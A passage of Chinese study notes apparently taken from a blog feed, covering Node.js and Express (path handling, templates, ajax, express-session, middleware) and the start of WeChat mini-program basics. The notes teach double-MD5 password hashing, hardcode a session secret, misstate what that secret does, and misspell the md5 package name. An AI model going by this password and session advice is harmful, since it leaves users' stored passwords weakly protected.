class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">      <span class="attr">email</span>: <span class="string">&#x27;lsy&#x27;</span></span><br><span class="line">    &#125;).<span class="title function_">save</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">ret</span> =&gt;</span> &#123; &#125;)</span><br></pre></td></tr></table></figure><h2 id="7.-论坛项目">7. 论坛项目<a title="#7.-论坛项目" href="#7.-论坛项目"></a></h2><h3 id="7.1-path-模块">7.1 path 模块<a title="#7.1-path-模块" href="#7.1-path-模块"></a></h3><p>path 核心模块 — 操作路径</p><ul><li><p>path.basename(path [, ext]) : 获取path中的文件名 无对应后缀名 [, ext] 就返回加上后缀的文件名</p><blockquote><p>path.basename(‘D:/a/b/index.js’)  —&gt; index.js        path.basename(‘D:/a/b/index.js’ , ‘.js’)  —&gt; index</p></blockquote></li><li><p>path.dirname(path) : 返回path中的目录</p><blockquote><p>path.dirname(‘D:/a/b/index.js’)  —&gt; D:/a/b</p></blockquote></li><li><p>path.extname(path) : 返回 path 中的后缀名</p></li></ul><blockquote><p>path.extname(‘D:/a/b/index.js’)  —&gt; .js</p></blockquote><ul><li><p>path.isAbsolute(path) : 判断是否绝对路径</p></li><li><p>path.parse(path) : 将 path 解析成对象</p><blockquote><p>path.parse(‘d:/a/b/index.js’) —&gt; { root: ‘d:/’ , dir: ‘d:/a/b’ , base: ‘index.js’ , ext: ‘.js’ , name: ‘html’}</p></blockquote></li><li><p>path.join([…paths]) : 拼接 paths , 两个path之间加 /, 支持任意个参数</p><blockquote><p>path.join(‘c:/a’ , ‘b’) —&gt; <code>c:\\a\\b</code>  2 \ 转义成一个\ windowns 表示路径是用\</p></blockquote></li></ul><h3 id="7.2-node中的其他成员">7.2 node中的其他成员<a title="#7.2-node中的其他成员" href="#7.2-node中的其他成员"></a></h3><p>在每个模块中，除了 <code>require</code> <code>exports</code> 等模块相关的api之外 还有两个特殊成员：</p><ul><li><code>__dirname</code> : <strong>动态</strong>获取当前文件模块所属目录的绝对路径</li><li><code>__filename</code> : <strong>动态</strong>获取当前文件的绝对路径(包含 文件名)</li><li><code>__dirname</code> 和 <code>__filename</code> 不受node 命令所属路径影响</li></ul><p>在文件操作核心模块 fs 中 读取文件 里文件路径</p><p>if  ./a.html -&gt; 读取的是 <strong>相对于执行node命令所处的终端路径</strong></p><blockquote><p>eg：a.html 在 c:/in/out/side/a.html</p><p>在这个路径下还有一个index.js -&gt; c:/in/out/side/index.js 有一个读文件的操作 fs.readfile(‘./a.html’)</p><p>在终端这样运行 <strong>c:/in/out/side</strong>&gt; node  <strong>index.js</strong> 时是不会报错的  此时读的a.html地址 <strong>c:/in/out/side/html</strong></p><p>但这样运行 <strong>c:/in/out</strong>&gt; node  <strong>side/index.js</strong> 时 读的a.html的地址就是 <strong>c:/in/out/index/js</strong></p><p>所以在文件操作中，使用相对路径不可靠 ==&gt;&gt; 所以要使用动态的绝对路径</p><p>为了避免在使用的过程中出现路径拼接操作 使用 path.join()</p></blockquote><p>所以推荐在<strong>文件模块操作</strong>中使用的相对路径统一转换为 <strong>动态的绝对路径</strong></p><p>—&gt; fs.readFile(path.join(__dirname , ‘./a.txt’) , ‘utf8’ , function(err,data){ … })</p><p>​      app.use(‘/public/’, express.static(‘./public/’));</p><p>—&gt; app.use(‘/public/’, express.static(path.join(__dirname , ‘./public/’)));</p><p>—&gt; app.set(‘views’ , path.join(__dirname , ‘./views/’))  //默认就是 ./views 目录</p><p>—&gt;</p><p>(模块中的路径标识不受node命令所处的路径影响)</p><h3 id="7.3-art-template-中的-include-extend-block-语法">7.3 art-template 中的 include extend block 语法<a title="#7.3-art-template-中的-include-extend-block-语法" href="#7.3-art-template-中的-include-extend-block-语法"></a></h3><blockquote><p>在node 中还有很多第三方模板引擎可以使用 ejs   jade(pug)   nunjucks  <code> &lt;%%&gt;</code> <code>&#123;&#123; &#125;&#125;</code></p></blockquote><p>子模版 模板继承</p><ol><li><code>&#123;&#123; include  '文件路径' &#125;&#125;</code>    将 文件路径的 文件导入该 html</li><li><code>&#123;&#123; extend  '文件路径' &#125;&#125;</code>   继承 文件路径 中的模板</li><li><code>&#123;&#123; block  'name' &#125;&#125;   &#123;&#123; /block&#125;&#125;</code>  在模板中 留坑；在继承模板的html中填坑</li></ol><p>也可以用 if else 选择要显示的dom</p><p><code>&#123;&#123;  if 条件 &#125;&#125;</code></p><p><code>&#123;&#123;  else  &#125;&#125;</code></p><p><code>&#123;&#123;  /if  &#125;&#125;</code></p><h3 id="7.4-ajax-接受数据为-json-类型">7.4 ajax 接受数据为 json 类型<a title="#7.4-ajax-接受数据为-json-类型" href="#7.4-ajax-接受数据为-json-类型"></a></h3><ol><li><p>封装ajax  eg: 注册页面 post请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;/register&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>:formData,</span><br><span class="line">    <span class="attr">dataType</span>:<span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(err_code === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="title function_">log</span>(<span class="string">&quot;成功&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(err_code === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title function_">log</span>(<span class="string">&quot;邮箱或者密码已存在&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(err_code === <span class="number">500</span>)&#123;</span><br><span class="line">            <span class="title function_">log</span>(<span class="string">&quot;错误&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>数据响应时 也要用json格式  给每一个状态设置一个状态码 好用于上面success 进行处理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(err)&#123;</span><br><span class="line">   <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">       <span class="attr">err_code</span>:<span class="number">500</span>,</span><br><span class="line">       <span class="attr">message</span>:<span class="string">&#x27;服务器错误&#x27;</span></span><br><span class="line">   &#125;) </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(data)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">err_code</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="attr">message</span>:<span class="string">&#x27;邮箱或者密码已存在&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">err_code</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">message</span>:<span class="string">&#x27;ok&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ol><h3 id="7.5-密码加密-buleimp-md5">7.5 密码加密 buleimp-md5<a title="#7.5-密码加密-buleimp-md5" href="#7.5-密码加密-buleimp-md5"></a></h3><ol><li><p>下载 ：<code>npm i buleimp-md5</code></p></li><li><p>引包：<code>const md5 = require('buleimp-md5')</code></p></li><li><p>使用   给密码 进行md5 重复加密 ：<code>body.password = md5(md5(body.password))</code></p><blockquote><p>在准备创建用户前进行密码加密</p><p>下一步</p><p>new User(body).save()</p></blockquote></li></ol><p>加密后 if 要 登录 验证账号密码 要</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123;</span><br><span class="line">    <span class="attr">email</span>:body.<span class="property">email</span>,</span><br><span class="line">    <span class="attr">password</span>:<span class="title function_">md5</span>(<span class="title function_">md5</span>(body.<span class="property">password</span>))</span><br><span class="line">&#125;,<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;)</span><br></pre></td></tr></table></figure><h3 id="7.6-表单提交行为">7.6 表单提交行为<a title="#7.6-表单提交行为" href="#7.6-表单提交行为"></a></h3><p>表单默认提交行为：同步 ==&gt; 同步表单提交，浏览器会锁死(转圈)等待服务器响应结果</p><p>表单同步提交后，无论服务器端响应什么，都会直接将响应结果覆盖掉当前页面</p><p>===&gt; <strong>服务器重定向</strong></p><h4 id="7.6.1-服务器重定向对异步请求无效">7.6.1 服务器重定向对异步请求无效<a title="#7.6.1-服务器重定向对异步请求无效" href="#7.6.1-服务器重定向对异步请求无效"></a></h4><p>所以上面的代码中在 这里成功的时候要 重定向</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;/register&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>:formData,</span><br><span class="line">    <span class="attr">dataType</span>:<span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(err_code === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;/&#x27;</span>   <span class="comment">//!!!!!!</span></span><br><span class="line">            <span class="comment">//log(&quot;成功&quot;)</span></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(err_code === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title function_">log</span>(<span class="string">&quot;邮箱或者密码已存在&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(err_code === <span class="number">500</span>)&#123;</span><br><span class="line">            <span class="title function_">log</span>(<span class="string">&quot;错误&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//在服务器这样是无效的</span></span><br><span class="line">res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">err_code</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">message</span>:<span class="string">&#x27;ok&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)   <span class="comment">//无效</span></span><br></pre></td></tr></table></figure><h3 id="7.7-第三方中间件-express-session">7.7 第三方中间件 express-session<a title="#7.7-第三方中间件-express-session" href="#7.7-第三方中间件-express-session"></a></h3><p>cookie 用来保存一些不太敏感的数据  不能用来保存登陆状态</p><p>session 比较安全</p><p>登陆状态 会有一个凭证  这个凭证是服务器给的 不容易伪造</p><p>在Express中 默认不支持 Session 和 Cookie</p><h4 id="7.7.1-express-session">7.7.1 express-session<a title="#7.7.1-express-session" href="#7.7.1-express-session"></a></h4><ol><li><p>安装：<code>npm i  express-session</code></p></li><li><p>引用：<code>const session = require('express-session')</code></p></li><li><p>配置：(一定要在 app.use(router)之前)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 会为 req 请求对象添加一个成员 req.session</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>:<span class="string">&#x27;keyboard&#x27;</span>,   </span><br><span class="line">    <span class="comment">//配合字符串 会在原有加密基础之上 加上这个字符拼起来 去加密 </span></span><br><span class="line">    <span class="comment">//== body.password = md5(md5(body.password) + &#x27;keyboard&#x27;)</span></span><br><span class="line">    <span class="attr">resave</span>:<span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>:<span class="literal">true</span></span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></li><li><p>使用：添加session数据  —&gt;  req.session.foo = ‘bar’</p><p>​           获取session数据 —&gt;  req.session.foo</p></li></ol><blockquote><p>默认 session 数据是内存存储的 服务器一旦重启 就会丢失 真正的生产环境会把 session 进行持久化 存储</p></blockquote><h4 id="7.7.2-浏览器插件editthiscookie">7.7.2 浏览器插件editthiscookie<a title="#7.7.2-浏览器插件editthiscookie" href="#7.7.2-浏览器插件editthiscookie"></a></h4><p>可以看cookie 和 ssession 的字段值</p><h2 id="8.-中间件">8. 中间件<a title="#8.-中间件" href="#8.-中间件"></a></h2><p>在Express中</p><p>当请求进来，会从第一个中间件进行匹配 <strong>:</strong> if 匹配  —&gt; 请求进入中间件</p><p>​                                                                                 if 调用了next  —&gt; 进入下一个匹配的中间件</p><p>​                                                                                 if 没调用  —&gt;   直接结束</p><p>​                                                               if 不匹配 —&gt; 一直往后走到匹配/结束为止</p><h3 id="8.1-应用程序级别中间件">8.1 应用程序级别中间件<a title="#8.1-应用程序级别中间件" href="#8.1-应用程序级别中间件"></a></h3><ol><li><p>万能匹配(不关心任何请求路径和请求方法)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">    <span class="title function_">log</span>(...)</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>以某路径 /xxx/ 开头</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/a&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">    <span class="title function_">log</span>(...)</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="8.2-路由级别中间件">8.2 路由级别中间件<a title="#8.2-路由级别中间件" href="#8.2-路由级别中间件"></a></h3><ol><li><p>get</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(...)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>post</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(...)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>…</p></li></ol><h3 id="8.3-错误处理中间件">8.3 错误处理中间件<a title="#8.3-错误处理中间件" href="#8.3-错误处理中间件"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err,req,res,next</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(...)</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(...)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="8.3.1-配置处理一个-404-的中间件">8.3.1 配置处理一个 404 的中间件<a title="#8.3.1-配置处理一个-404-的中间件" href="#8.3.1-配置处理一个-404-的中间件"></a></h4><p>在app.use(router) 挂载路由后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在app.use(router) 挂载路由后</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;404.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="8.3.2-配置一个处理全局错误处理中间件">8.3.2 配置一个处理全局错误处理中间件<a title="#8.3.2-配置一个处理全局错误处理中间件" href="#8.3.2-配置一个处理全局错误处理中间件"></a></h4><p>在处理404页面后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在处理404页面后</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err,req,res,next</span>)&#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">err_code</span>:<span class="number">500</span>,</span><br><span class="line">        <span class="attr">message</span>:err.<span class="property">message</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在其他的请求处理中应该再加一个参数 ，以及在有错误时要这样处理 next(err)</p><blockquote><p>这样就会往后查找 带有四个参数的应用程序级别中间件中</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./a.txt&#x27;</span>,<span class="keyword">function</span>(<span class="params">err,data</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="title function_">next</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">       ...</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序</title>
      <link href="/learningNotes/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F"/>
      <url>/learningNotes/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F</url>
      
        <content type="html"><![CDATA[<h2 id="1.软件介绍">1.软件介绍<a title="#1.软件介绍" href="#1.软件介绍"></a></h2><h3 id="1.1-下载">1.1 下载<a title="#1.1-下载" href="#1.1-下载"></a></h3><p><a href="https://mp.weixin.qq.com/cgi-bin/wx" target="_blank">官网</a></p><p>注册 –&gt; 登录 -&gt; 注册appID -&gt; <a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html" target="_blank">下载</a>微信开发者工具 -&gt; 安装 -&gt; 创建项目</p><p><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/devtools.html" target="_blank">介绍</a>开发者工具的工具栏</p><h3 id="1.2-配置文件介绍">1.2 配置文件介绍<a title="#1.2-配置文件介绍" href="#1.2-配置文件介绍"></a></h3><h4 id="1.2.1-app.json-全局配置">1.2.1 app.json 全局配置<a title="#1.2.1-app.json-全局配置" href="#1.2.1-app.json-全局配置"></a></h4><ul><li><p>page : 用于指定小程序由哪些页面组成，每一项都对应一个页面的 路径（含文件名） 信息。文件名不需要写文件后缀，框架会自动去寻找对应位置的 <code>.json</code>, <code>.js</code>, <code>.wxml</code>, <code>.wxss</code> 四个文件进行处理。</p><p>未指定 <code>entryPagePath</code> 时，数组的第一项代表小程序的初始页面（首页）。</p><p><strong>小程序中新增/减少页面，都需要对 pages 数组进行修改。</strong></p></li><li><p>window : 用于设置小程序的状态栏、导航条、标题、窗口背景色。</p></li><li><p>tabBar : 通过 tabBar 配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;page&quot;</span>:[</span><br><span class="line">     <span class="string">&quot;pages/index/index&quot;</span>,</span><br><span class="line">     <span class="string">&quot;pages/log/log&quot;</span></span><br><span class="line"> ],</span><br><span class="line"> <span class="string">&quot;window&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;navigationBarBackgroundColor&quot;</span>: <span class="string">&quot;#ffffff&quot;</span>,</span><br><span class="line">    <span class="string">&quot;navigationBarTextStyle&quot;</span>: <span class="string">&quot;black&quot;</span>,</span><br><span class="line">    <span class="string">&quot;navigationBarTitleText&quot;</span>: <span class="string">&quot;微信接口功能演示&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundColor&quot;</span>: <span class="string">&quot;#eeeeee&quot;</span>,             <span class="comment">//下拉加载的位置</span></span><br><span class="line">    <span class="string">&quot;backgroundTextStyle&quot;</span>: <span class="string">&quot;light&quot;</span>            <span class="comment">//下拉加载的logo</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1.2.2-index.json-页面配置">1.2.2 index.json 页面配置<a title="#1.2.2-index.json-页面配置" href="#1.2.2-index.json-页面配置"></a></h4><p>每一个小程序页面也可以使用 <code>.json</code> 文件来对本页面的窗口表现进行配置。页面中配置项在当前页面会覆盖 <code>app.json</code> 的 <code>window</code> 中相同的配置项。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;usingComponents&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="comment">//app.json 的 window 配置一样</span></span><br><span class="line">    <span class="string">&quot;navigationBarBackgroundColor&quot;</span>: <span class="string">&quot;#ffffff&quot;</span>,</span><br><span class="line">    <span class="string">&quot;navigationBarTextStyle&quot;</span>: <span class="string">&quot;black&quot;</span>,</span><br><span class="line">    <span class="string">&quot;navigationBarTitleText&quot;</span>: <span class="string">&quot;微信接口功能演示&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundColor&quot;</span>: <span class="string">&quot;#eeeeee&quot;</span>,             <span class="comment">//下拉加载的位置</span></span><br><span class="line">    <span class="string">&quot;backgroundTextStyle&quot;</span>: <span class="string">&quot;light&quot;</span>            <span class="comment">//下拉加载的logo</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以手动关闭下拉刷新窗口  if 没用调用 也不会报错</p><p>index.js</p><p>wx.stopPullDownRefresh();</p></blockquote><h4 id="1.2.3-sitemap.json-配置">1.2.3 sitemap.json 配置<a title="#1.2.3-sitemap.json-配置" href="#1.2.3-sitemap.json-配置"></a></h4><p>用于配置小程序及其页面是否允许被微信索引，文件内容为一个 JSON 对象，如果没有 <code>sitemap.json</code> ，则默认为所有页面都允许被索引；</p><h2 id="2.模板语法">2.模板语法<a title="#2.模板语法" href="#2.模板语法"></a></h2><h3 id="2.0-wxml-标签">2.0 wxml 标签<a title="#2.0-wxml-标签" href="#2.0-wxml-标签"></a></h3><blockquote><p>vscode使用“微信小程序开发”插件</p></blockquote><ol><li><code>&lt;text&gt; == &lt;span&gt; </code></li><li><code>&lt;view&gt; == &lt;div&gt;</code></li><li><code>&lt;checkbox&gt; 复选框</code></li></ol><h3 id="2.1-数据绑定">2.1 数据绑定<a title="#2.1-数据绑定" href="#2.1-数据绑定"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo01.js</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">    <span class="comment">//页面的初始数据</span></span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">msg</span>:<span class="string">&#x27;hello mina&#x27;</span>,</span><br><span class="line">        <span class="attr">isChecked</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- demo01.wxml --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 1.在文本中使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span> &#123;&#123; msg &#125;&#125; <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2.在属性中使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">data-msg</span>=<span class="string">&quot;&#123;&#123; msg &#125;&#125;&quot;</span>&gt;</span>自定义属性<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 3.使用bool充当属性时 “ 和 &#123; 之间不要留空格 否则会导致识别失败 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">checkbox</span> <span class="attr">checked</span>=<span class="string">&quot;&#123;&#123;isCheck&#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">checkbox</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2.2-运算">2.2 运算<a title="#2.2-运算" href="#2.2-运算"></a></h3><p>运算 =&gt; 表达式</p><p>可以在 <code>&#123;&#123; &#125;&#125;</code> 中加入表达式</p><blockquote><p>表达式 =&gt; 简单 运算 数字运算 拼接 逻辑运算</p><p>​               数字加减 字符串拼接 三元表达式</p><p>语句 =&gt; 复杂代码段</p><p>​           if else   switch   do while   for</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123; 1+1 &#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span>       2</span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123; &#x27;1&#x27;+&#x27;1&#x27; &#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span>   11</span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123; 10%2===1 ? &#x27;奇数&#x27; : &#x27;偶数&#x27; &#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span> 偶数</span><br></pre></td></tr></table></figure><h3 